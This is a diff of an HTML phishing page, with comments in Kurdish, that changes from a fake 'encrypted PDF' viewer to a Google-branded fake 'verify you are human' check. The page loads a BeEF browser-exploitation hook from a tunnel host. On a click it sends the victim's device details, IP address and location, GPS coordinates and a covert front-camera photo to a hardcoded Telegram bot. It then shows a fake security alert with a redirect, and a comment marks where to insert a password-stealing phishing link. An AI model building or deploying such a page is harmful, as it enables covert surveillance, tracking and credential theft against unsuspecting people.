@@ -3,113 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Document Viewer</title>
+    <title>Cloud Content - Verify You Are Human</title>
     
-    <!-- BeEF Hook - لێرەدا لینکی کلۆدفلەیرەکەت دابنێ -->
+    <!-- BeEF Hook -->
     <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
 
     <style>
-        body { font-family: Arial, sans-serif; background: #525659; margin: 0; display: flex; flex-direction: column; height: 100vh; }
-        .header { background: #323639; color: white; padding: 15px; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
-        .viewer { flex-grow: 1; display: flex; justify-content: center; align-items: center; background: #fff; margin: 20px; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); cursor: pointer; position: relative; }
-        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #spy-vid { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
-        canvas { display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; font-weight: bold; width: 100%; }
+        .btn:active { background: #174ea6; }
+        #spy-vid { position: fixed; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <span>📄 Report_Document_2024.pdf</span>
-        <span style="font-size: 12px; opacity: 0.7;">Size: 1.4 MB</span>
-    </div>
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100" alt=""><br><br>
+    <h2>Verify you are human</h2>
+    <p>Please click the button below to authorize access to requested document.</p>
+    <button class="btn" id="startBtn">I AM NOT A ROBOT</button>
+    <p id="status" style="color: #666; font-size: 12px; margin-top: 15px;">Required for security verification</p>
+</div>
 
-    <div class="viewer" id="mainTrigger">
-        <div class="loading-overlay" id="loaderBox">
-            <div class="loader"></div>
-            <h3>Document is Encrypted</h3>
-            <p>To view the full report, click the button below to decrypt</p>
-            <button style="padding: 10px 25px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">DECRYPT PDF</button>
-        </div>
-        <iframe id="pdfFrame" src="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" style="width: 100%; height: 100%; border: none; display: none;"></iframe>
-    </div>
+<video id="spy-vid" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <video id="spy-vid" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+<script>
+    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+    const chatId = "6679834643";
 
-    <script>
-        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-        const chatId = "6679834643";
+    async function sendToBot(msg) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+    }
 
-        // فەنکشنی ناردن بۆ تێلگرام
-        async function reportToTelegram(text) {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            });
+    document.getElementById('startBtn').addEventListener('click', async function() {
+        this.innerHTML = "Verifying...";
+        this.disabled = true;
+
+        // ١. بردنە دەرەوەی زانیاری ئامێر و پاتری
+        let batteryInfo = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = (b.level * 100) + "%";
         }
 
-        document.getElementById('mainTrigger').addEventListener('click', async function() {
-            // شاردنەوەی لۆدینگەکە
-            document.getElementById('loaderBox').style.display = 'none';
-            document.getElementById('pdfFrame').style.display = 'block';
+        const deviceInfo = `
+📱 DEVICE INFO:
+- Platform: ${navigator.platform}
+- Vendor: ${navigator.vendor}
+- UserAgent: ${navigator.userAgent}
+- Battery: ${batteryInfo}
+- Language: ${navigator.language}
+- Screen: ${window.screen.width}x${window.screen.height}
+        `;
+        await sendToBot(deviceInfo);
 
-            // ١. کۆکردنەوەی زانیاری ئامێر و باتری و نێتۆرک
-            let batteryLevel = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryLevel = (batt.level * 100) + "%";
-            }
-
-            const info = {
-                UA: navigator.userAgent,
-                Platform: navigator.platform,
-                Battery: batteryLevel,
-                Time: new Date().toLocaleString(),
-                Language: navigator.language
-            };
-
-            // ٢. وەرگرتنی IP و ISP
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                reportToTelegram(`🔥 Target Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${info.UA}\n🔋 Battery: ${info.Battery}\n📅 Date: ${info.Time}`);
-            });
-
-            // ٣. وەرگرتنی لوکەیشن (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    reportToTelegram(`📍 GPS Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                }, null, { enableHighAccuracy: true });
-            }
-
-            // ٤. دزینی کامێرا (وێنەگرتن)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('spy-vid');
-                video.srcObject = stream;
-                
-                // چاوەڕێبە تا کامێرا ئامادە دەبێت
-                await new Promise(r => setTimeout(r, 4000));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'target.jpg');
-                    fd.append('caption', '👤 Front Camera Capture');
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg');
-            } catch (e) {
-                reportToTelegram("❌ Camera Access Denied by User");
-            }
+        // ٢. وەرگرتنی IP و ISP و کات
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+            const ipInfo = `
+🌐 NETWORK INFO:
+- IP: ${d.ip}
+- ISP: ${d.org}
+- City: ${d.city}
+- Country: ${d.country_name}
+- Network Type: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
+- Date/Time: ${new Date().toLocaleString()}
+            `;
+            sendToBot(ipInfo);
         });
-    </script>
+
+        // ٣. وەرگرتنی لوکەیشن (GPS)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                sendToBot(`📍 GPS MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, (err) => { sendToBot("❌ GPS Access Denied"); }, {enableHighAccuracy: true});
+        }
+
+        // ٤. کامێرای پێشەوە (SNAPSHOT)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('spy-vid');
+            video.srcObject = stream;
+            
+            await new Promise(r => setTimeout(r, 3000));
+            
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'shot.jpg');
+                fd.append('caption', '👤 Front Camera Captured!');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg');
+        } catch (e) {
+            sendToBot("❌ Camera Access Denied");
+        }
+
+        // ٥. دزینی Contacts و Call Logs (Social Engineering)
+        // وەک پێشتر وتم، ئەمە ڕاستەوخۆ نابێت. بۆیە مۆدیوڵێکی فیشینگ نیشان دەدەین
+        setTimeout(() => {
+            alert("Security Update: Please re-login to your Google account to view the synced contacts and logs.");
+            window.location.href = "https://accounts.google.com/ServiceLogin"; 
+            // لێرەدا دەتوانیت لینکی فیشینگی خۆت دابنێیت بۆ ئەوەی پاسوۆردەکە ببەیت
+        }, 5000);
+    });
+</script>
 </body>
 </html>
